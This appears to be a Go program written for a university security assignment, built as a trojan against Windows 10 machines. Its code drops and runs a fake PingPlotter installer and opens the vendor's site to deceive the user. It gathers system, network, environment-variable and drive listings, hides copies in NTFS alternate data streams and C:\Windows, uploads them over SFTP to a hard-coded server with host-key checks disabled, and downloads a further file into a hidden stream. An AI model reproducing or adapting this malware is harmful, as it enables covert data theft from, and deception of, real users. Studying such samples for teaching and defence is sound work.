package main

/*

-- Assignment 2c --
S3636862 -- Negar Farshchi
S3751243 -- Matthew Waiariki

-- Target is Windows 10 machine. --
It is able to handle is user is using a OneDrive Desktop or Normal Desktop
Set custom SFTP server, use flag " -sftp "sftp server address"

*/

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"time"

	"github.com/elastic/go-sysinfo"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

// main() Simply Calls functions in order of use.
func main() {
	setupFakeEnv()
	saveSystemInfo()
	fileManger()
	bluffUser()
	informUserOfHack()
}

// setupFakeEnv() recreates files saved in byte form, it also creates files and folders that will be used.
func setupFakeEnv() {
	// Makes a folder called Moto in the user Temp Folder
	usrDir := getUserHomeDir()
	path := filepath.Join(usrDir, "\\AppData\\Local\\Temp\\Moto\\")
	os.MkdirAll(path, os.ModePerm)

	// Create Fake Installer
	fakeInstall, err := PingPlotterFakeResource()
	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
	installer.Write(fakeInstall)
	installer.Close()
	if err != nil {
		fmt.Println(err)
	}
	// Create ReadMe File
	readMeFile, err := ReadmeResource()
	readme, err := os.Create("Readme.txt")
	readme.Write(readMeFile)
	readme.Close()
	if err != nil {
		fmt.Println(err)
	}
	// Create SSH File
	sshKeyFile, err := PrvtResource()
	sshKey, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\key.pem")
	sshKey.Write(sshKeyFile)
	sshKey.Close()
	if err != nil {
		fmt.Println(err)
	}

	desktop := OneDriveCheck()
	// Create Batch File
	batFile, err := Startup3751243Resource()
	bat, err := os.Create(usrDir + desktop + "startup3751243.bat")
	bat.Write(batFile)
	bat.Close()
	if err != nil {
		fmt.Println(err)
	}
}

// OneDriveCheck finds if the system has Onedrive enabled and changes desktop location accordingly
func OneDriveCheck() string {
	var desktopLocation string

	usrDir := getUserHomeDir()
	fmt.Println(usrDir)

	if _, err := os.Stat(usrDir + "\\Desktop\\"); err != nil {
		if os.IsNotExist(err) {
			desktopLocation += "\\OneDrive"
		}
	}
	desktopLocation += "\\Desktop\\"

	return desktopLocation
}

// saveAllInfo() is the parent function that initializes each grab functions to get system information and stores them to setup.dll
func saveSystemInfo() {
	usrDir := getUserHomeDir()
	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")

	// Declares Variables and calls functions to fill them
	system := sysGrab()
	environment := envGrab()
	network := netGrab()
	folders := folderGrab()

	// writes variables to file
	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")

	// quick  error catcher
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
}

// fileManger() is a parrent function to ensure each are done consecutively
func fileManger() {
	copyFiles()
	syncWithSFTP()
}

// copyFiles() copies captured system information to all desired locations.
func copyFiles() {
	usrDir := getUserHomeDir()
	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("COPY DONE")
}

// syncWithSFTP() uploads and downloads files to SFTP servers
func syncWithSFTP() {
	// pemBytes reads in the SSH Key for use.
	usrDir := getUserHomeDir()
	pemBytes, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\key.pem")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("key LOADED")
	signer, err := ssh.ParsePrivateKey(pemBytes)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("signer LOADED")
	auths := []ssh.AuthMethod{ssh.PublicKeys(signer)}
	fmt.Println("auths LOADED")
	cfg := &ssh.ClientConfig{
		User:            "tester",
		Auth:            auths,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	fmt.Println("cfg LOADED")

	// flags are checked to see if there is a change in sftp server, else defaults to 10.0.0.33
	var sftpIP string
	flag.StringVar(&sftpIP, "sftp", "10.0.0.33", "specify IP address of sftp server.  defaults to 10.0.0.33")
	flag.Parse()
	// Connect to SFTP Server
	cfg.SetDefaults()
	connect, err := ssh.Dial("tcp", (sftpIP + ":22"), cfg)
	if err != nil {
	}
	defer connect.Close()
	fmt.Println("SFTP connected")

	// Create new SFTP client
	client, err := sftp.NewClient(connect)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()
	fmt.Println("client LOADED")

	// Walk directory on Remote (dev)
	// w := client.Walk("/")
	// for w.Step() {
	// 	if w.Err() != nil {
	// 		continue
	// 	}
	// 	log.Println(w.Path())
	// }
	// 	fmt.Println("walking COMPLETE")

	// Export System Data
	// Hard Coded Alternative datastreams accessed
	localfiles := []string{"Readme.txt", "Readme.txt:crapS3751243.dll", "Readme.txt:crapS3636862.dll"}
	remotefiles := []string{"Readme.txt", "Readme.txt.crapS3751243.dll", "Readme.txt.crapS3636862.dll"}

	if len(localfiles) == len(remotefiles) {
		for i := range localfiles {
			fmt.Println(localfiles[i])
			fmt.Println(remotefiles[i])

			localDir, err := os.Open(localfiles[i])
			if err != nil {
				fmt.Println(err)
			}
			fmt.Println("Upload Staged.")
			parent := filepath.Dir("\\")
			path := string(filepath.Separator)
			dirs := strings.Split(parent, path)
			for _, dir := range dirs {
				path = filepath.Join(path, dir)
				_ = client.Mkdir("\\")

			}
			uploadDir, err := client.Create(remotefiles[i])
			_, err = io.Copy(uploadDir, localDir)
			i++
		}

	}
	fmt.Println("Upload COMPLETE")

	// Checks system if OneDrive is in use for Desktop location, Sets path accordingly
	desktop := OneDriveCheck()

	// Setup for downloading file from Remote
	srcPath := ""
	dstPath := (usrDir + desktop + "startup3751243.bat:")
	filename := "bannana.html"

	// Open the source file
	srcFile, err := client.Open(srcPath + filename)
	if err != nil {
		log.Fatal(err)
	}
	defer srcFile.Close()

	// Create the destination file
	dstFile, err := os.Create(dstPath + filename)
	if err != nil {
		log.Fatal(err)
	}
	defer dstFile.Close()

	// Copy the file
	srcFile.WriteTo(dstFile)
	fmt.Println("bannana DOWNLOADED")
}

// sysGrab() uses "github.com/elastic/go-sysinfo" to grab host information and return as a string
func sysGrab() string {
	var systemInfo string

	f, err := sysinfo.Host()
	info := f.Info()

	systemInfo += "Hostname => " + info.Hostname
	systemInfo += "\nTimezone => " + info.Timezone
	systemInfo += "\nKernel => " + info.KernelVersion
	systemInfo += "\nUniqueID => " + info.UniqueID

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return systemInfo
}

// netGrab() uses "github.com/elastic/go-sysinfo" to grab network information and return as a string
func netGrab() string {
	// Get Network Info
	var networkInfo string

	f, err := sysinfo.Host()
	net := f.Info()

	mac := reflect.ValueOf(net.MACs).Interface().([]string)
	networkInfo += "MAC Addresses =>"
	for i := range mac {
		networkInfo += "\n\t" + net.MACs[i]
	}

	ips := reflect.ValueOf(net.IPs).Interface().([]string)
	networkInfo += "\n IP Addresses => "
	for i := range ips {
		networkInfo += "\n\t" + net.IPs[i]
	}

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return networkInfo
}

// envGrab() uses in build OS function to grab environmental information and return as a string
func envGrab() string {
	// Get env variables
	var envoInfo string
	for _, element := range os.Environ() {
		variable := strings.Split(element, "=")
		onlyString := variable[0] + " => " + variable[1] + "\n"
		envoInfo += onlyString
	}
	return envoInfo
}

// folderGrab() uses in build OS function to grab all files/folders in C:\ drive and return as a string
func folderGrab() string {
	// Get all folders and files in searchFolder
	var envoInfo string
	searchFolder := "C:\\"

	files, err := ioutil.ReadDir(searchFolder)
	if err != nil {
	}
	for _, f := range files {
		envoInfo += searchFolder + f.Name() + "\n"
	}

	return envoInfo
}

// getUserHomeDir() uses the Environmental variables to locate the current users home directory returning is as a string
func getUserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

// bluffUser() to match spec, this runs a fake installer to bluff the user into thinking the file works as expected
// continues bluff by linking to actual website of Alledged program
func bluffUser() {
	usrDir := getUserHomeDir()

	time.Sleep(time.Second)
	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
	cmd1.Run()
	// pid := cmd1.Process.Pid
	// fmt.PrintLn(pid)
	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
}

// informUserOfHack() is used to run batch file that extracts file from ADS of itself and run it for the user to see
func informUserOfHack() {
	time.Sleep(10 * time.Second)
	usrDir := getUserHomeDir()
	desktop := OneDriveCheck()
	cmd := exec.Command("cmd", "/C", "start", (usrDir + desktop + "startup3751243.bat"))
	cmd.Start()
}
